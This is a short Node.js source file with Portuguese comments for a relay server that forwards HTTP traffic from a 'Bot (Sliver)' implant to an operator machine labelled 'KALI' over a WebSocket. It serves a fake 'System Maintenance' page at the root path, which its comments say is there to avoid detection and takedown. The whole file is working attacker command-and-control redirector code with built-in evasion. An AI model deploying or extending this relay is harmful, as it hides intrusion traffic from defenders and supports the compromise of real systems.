const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI = null;

const server = http.createServer((req, res) => {
    // Simulação de Site Real para evitar detecção e queda
    if (req.url === '/') {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('<h1>System Maintenance</h1><p>Server is running under optimization.</p>');
        return;
    }

    // Se o tráfego for do Bot (Sliver), ele envia para o KALI
    let body = [];
    req.on('data', (chunk) => { body.push(chunk); });
    req.on('end', () => {
        body = Buffer.concat(body).toString('base64');
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            // Encaminha a requisição HTTP do Bot para o Kali via WebSocket
            KALI.send(JSON.stringify({
                t: 'http_req',
                method: req.method,
                url: req.url,
                headers: req.headers,
                body: body
            }));
            res.writeHead(200);
            res.end("OK"); // O Sliver recebe o OK e aguarda
        } else {
            res.writeHead(503);
            res.end("Gateway Timeout");
        }
    });
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI = ws;
        console.log("[+] Operador KALI conectado.");
    }
});

server.listen(PORT, () => console.log(`Relay v17 rodando na porta ${PORT}`));
